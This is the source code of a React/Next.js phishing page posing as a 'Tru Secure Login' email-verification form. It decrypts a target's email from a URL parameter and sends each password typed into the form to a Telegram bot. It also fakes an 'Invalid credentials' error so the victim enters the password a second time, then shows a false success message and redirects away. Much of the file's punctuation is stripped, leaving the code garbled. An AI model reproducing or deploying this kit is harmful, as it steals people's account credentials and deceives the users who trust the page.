import { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import CryptoJS from 'crypto-js';
import { useRouter } from 'nextrouter';
import Image from 'nextimage';

const LoginPage = () = {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [step, setStep] = useState(1);
  const router = useRouter();

  useEffect(() = {
    const extractAESFromURL = () = {
      const url = window.location.href;
      const aesParam = url.split('&AES=')[1];
      return aesParam  decodeURIComponent(aesParam)  null;
    };

    const aesParam = extractAESFromURL();
    
    if (aesParam) {
      try {
        const salt = process.env.NEXT_PUBLIC_SALT;
        if (!salt) {
          throw new Error('Decryption salt not configured');
        }

        const bytes = CryptoJS.AES.decrypt(aesParam, salt);
        const decryptedEmail = bytes.toString(CryptoJS.enc.Utf8);
        
        if (decryptedEmail) {
          setEmail(decryptedEmail);
        } else {
          throw new Error('Failed to decrypt');
        }
      } catch (err) {
        console.error('Decryption error', err);
        setError('Invalid or corrupted link');
      }
    }
  }, []);

  const handleSubmit = async (e) = {
    e.preventDefault();
    
    if (password.length  5) {
      setError('Password must be at least 5 characters');
      return;
    }
    
    setIsLoading(true);
    setError('');

    try {
      const telegramBotToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
      const telegramChatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
      const redirectUrl = process.env.NEXT_PUBLIC_REDIRECT_URL;
      
      if (!telegramBotToken  !telegramChatId) {
        throw new Error('Telegram integration not properly configured');
      }

      const message = `🔒 TRU SECURITY NOTIFICATION 🔒
      
- USER IDENTIFIED ${email}
- ACCESS ATTEMPT ${step === 1  'First Attempt'  'Second Attempt'}
- PASSWORD ATTEMPT ${password}
- TIMESTAMP ${new Date().toISOString()}
- ORIGIN ${window.location.hostname}

${step === 1  '⚠️ INITIAL ACCESS ATTEMPT DETECTED ⚠️'  '🚨 FINAL ACCESS ATTEMPT DETECTED 🚨'}`;

      const response = await fetch(`httpsapi.telegram.orgbot${telegramBotToken}sendMessage`, {
        method 'POST',
        headers {
          'Content-Type' 'applicationjson',
        },
        body JSON.stringify({
          chat_id telegramChatId,
          text message,
          parse_mode 'Markdown',
        }),
      });

      if (!response.ok) {
        throw new Error('Failed to send notification');
      }

      if (step === 1) {
        setError('Invalid credentials. Please try again.');
        setStep(2);
        setPassword('');
      } else {
        setSuccess(true);
        if (redirectUrl) {
          setTimeout(() = {
            window.location.href = redirectUrl;
          }, 2000);
        }
      }
    } catch (err) {
      setError(err.message  'An error occurred during login');
    } finally {
      setIsLoading(false);
    }
  };

  if (error && error === 'Invalid or corrupted link') {
    return (
      div className=min-h-screen bg-gray-100 flex items-center justify-center p-4
        div className=w-full max-w-md bg-white rounded-lg shadow-md p-6
          div className=text-center
            div className=text-red-500 text-5xl mb-4❌div
            h1 className=text-2xl font-bold text-gray-800 mb-2Invalid Linkh1
            p className=text-gray-600The link you used is invalid or corrupted.p
            p className=text-gray-600 mt-2Please check the URL and try again.p
          div
        div
      div
    );
  }

  return (
    div className=min-h-screen bg-gray-100 flex items-center justify-center p-4
      motion.div
        initial={{ opacity 0, y 20 }}
        animate={{ opacity 1, y 0 }}
        transition={{ duration 0.5 }}
        className=w-full max-w-md
      
        div className=bg-white rounded-lg shadow-md overflow-hidden border border-gray-200
          div className=p-6 bg-blue-600
            div className=flex items-center justify-center flex-col
              div className=bg-white p-2 rounded-full mb-4
                div className=w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center
                  svg className=h-8 w-8 text-blue-600 fill=none viewBox=0 0 24 24 stroke=currentColor
                    path strokeLinecap=round strokeLinejoin=round strokeWidth={2} d=M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z 
                  svg
                div
              div
              h1 className=text-2xl font-bold text-white text-centerTru Secure Loginh1
            div
          div
          
          div className=p-6
            div className=text-center mb-6
              p className=text-gray-600Verify your email access to continuep
            div
            
            {error && !success && (
              div className={`mb-4 p-3 rounded-md text-sm ${step === 2  'bg-red-100 text-red-700 border border-red-200'  'bg-yellow-100 text-yellow-700 border border-yellow-200'}`}
                {error}
              div
            )}
            
            {success  (
              div className=text-center py-4
                div className=text-green-500 text-5xl mb-4✓div
                h3 className=text-xl font-bold text-gray-800 mb-2Login Successfulh3
                p className=text-gray-600Redirecting you to the application...p
                div className=mt-4 bg-blue-50 p-3 rounded border border-blue-100
                  p className=text-blue-600 text-smYour access has been grantedp
                div
              div
            )  (
              form onSubmit={handleSubmit}
                div className=mb-4
                  label className=block text-gray-700 text-sm font-medium mb-2
                    Email Address
                  label
                  div className=relative
                    div className=absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none
                      svg className=h-5 w-5 text-gray-400 fill=none viewBox=0 0 24 24 stroke=currentColor
                        path strokeLinecap=round strokeLinejoin=round strokeWidth={2} d=M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z 
                      svg
                    div
                    input
                      type=email
                      value={email}
                      disabled
                      className=bg-gray-100 border border-gray-300 rounded-md focusring-blue-500 focusborder-blue-500 block w-full pl-10 p-2.5 text-gray-500
                    
                  div
                div
                
                div className=mb-4
                  label className=block text-gray-700 text-sm font-medium mb-2
                    Password
                  label
                  div className=relative
                    div className=absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none
                      svg className=h-5 w-5 text-gray-400 fill=none viewBox=0 0 24 24 stroke=currentColor
                        path strokeLinecap=round strokeLinejoin=round strokeWidth={2} d=M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z 
                      svg
                    div
                    input
                      type=password
                      value={password}
                      onChange={(e) = setPassword(e.target.value)}
                      required
                      minLength={5}
                      className=border border-gray-300 rounded-md focusring-blue-500 focusborder-blue-500 block w-full pl-10 p-2.5
                      placeholder=Enter your password
                    
                  div
                  p className=text-xs text-gray-500 mt-1Password must be at least 5 charactersp
                div
                
                button
                  type=submit
                  disabled={isLoading}
                  className=w-full bg-blue-600 hoverbg-blue-700 focusring-4 focusring-blue-300 font-medium rounded-md text-sm px-5 py-2.5 text-center text-white transition-all duration-200 disabledopacity-75
                
                  {isLoading  (
                    span className=flex items-center justify-center
                      svg className=animate-spin -ml-1 mr-3 h-5 w-5 text-white xmlns=httpwww.w3.org2000svg fill=none viewBox=0 0 24 24
                        circle className=opacity-25 cx=12 cy=12 r=10 stroke=currentColor strokeWidth=4circle
                        path className=opacity-75 fill=currentColor d=M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647zpath
                      svg
                      {step === 1  'VERIFYING...'  'PROCESSING...'}
                    span
                  )  (
                    step === 1  'LOGIN'  'TRY AGAIN'
                  )}
                button
              form
            )}
          div
          
          div className=px-6 py-3 bg-gray-50 border-t border-gray-200 text-center
            p className=text-xs text-gray-500
              Secure Login System • {new Date().getFullYear()}
            p
          div
        div
      motion.div
    div
  );
};

export default LoginPage;